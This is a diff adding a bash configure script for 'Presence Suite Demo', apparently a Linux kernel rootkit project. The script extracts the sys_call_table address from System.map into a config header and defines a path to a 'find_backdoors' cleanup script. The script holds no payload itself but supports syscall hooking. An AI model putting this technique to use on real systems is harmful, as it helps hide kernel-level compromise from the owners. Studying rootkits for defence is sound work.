@@ -1,0 +1,24 @@
+#!/bin/bash
+
+INPUT=include/config_raw.h
+OUTPUT=include/config.h
+
+echo ""
+echo "[*] PRESENCE CONFIGURE SCRIPT: "
+echo "Copyright 2012 Gregory Bekher - Presence Suite Demo"
+echo ""
+echo "[*] Configuring Presence for your system"
+echo ""
+rm $OUTPUT
+cat $INPUT > $OUTPUT
+printf "0x" >> $OUTPUT
+grep sys_call_table /boot/System.map-$(uname -r) |awk '{print $1}' >> $OUTPUT
+echo "#define UL_CLEAN_SCRIPT \"\\" >> $OUTPUT
+printf ${PWD}  >> $OUTPUT
+printf "/find_backdoors\"" >> $OUTPUT
+echo "" >> $OUTPUT
+echo "#endif" >> $OUTPUT
+echo "[*] Assuming that user has necessary dependencies including gcc and kernel headers"
+echo ""
+echo "[*] Configuration completed"
+echo ""
